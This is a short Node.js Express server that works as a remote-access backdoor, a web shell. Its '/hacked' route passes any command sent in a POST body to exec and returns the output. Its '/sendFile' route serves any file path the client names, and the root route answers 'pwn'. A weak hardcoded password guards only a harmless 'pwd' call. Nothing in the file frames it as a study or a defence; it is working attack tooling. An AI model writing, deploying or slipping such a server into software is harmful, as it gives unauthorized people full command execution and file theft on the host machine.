import { exec } from "child_process";
import express, { urlencoded } from "express";
import axios from "axios";
import bodyParser from "body-parser";


const port = 80;
const app = express();
const client_Url ="http://10.40.32.241:3000";
//  "http://localhost:3000";
app.use(bodyParser.urlencoded({ extended: true }));

const passwrd = 1234;
app.get("/", function(req,res){
    res.send("pwn");
})
app.post("/sendFile", function(req,res){
    console.log(req.body.path);
    let path = req.body.path;
    // res.attachment(path)
    res.sendFile(path);
})
app.post("/", function (req, res) {
	// console.log;
    let passw = req.body.passwd
    if(passw==passwrd){
        exec("pwd", function (err, output, stdError) {
            if (err) {
                // console.log("error: " + err);
                res.send("error: " + err);
                return;
            }
            if (stdError) {
                // console.log("error: " + stdError);
                res.send("error: " + stdError);
                return;
            }
            // console.log("output: " + output);
            res.send(output);
        });
    }
	console.log(req.body);
});

app.post("/hacked", function (req, res) {
	let command = req.body.commands;
    exec(command, function (err, output, stdError) {
        if (err) {
            // console.log("error: " + err);
            res.send("error: "+err);
            return;
        }
        if (stdError) {
            // console.log("error: " + stdError);
            res.send("error: " + stdError);
            return;
        }
        // console.log("output: " + output);
        res.send(output);
    });
});


app.listen(port, function () {
	console.log("Listening on port " + port);
});
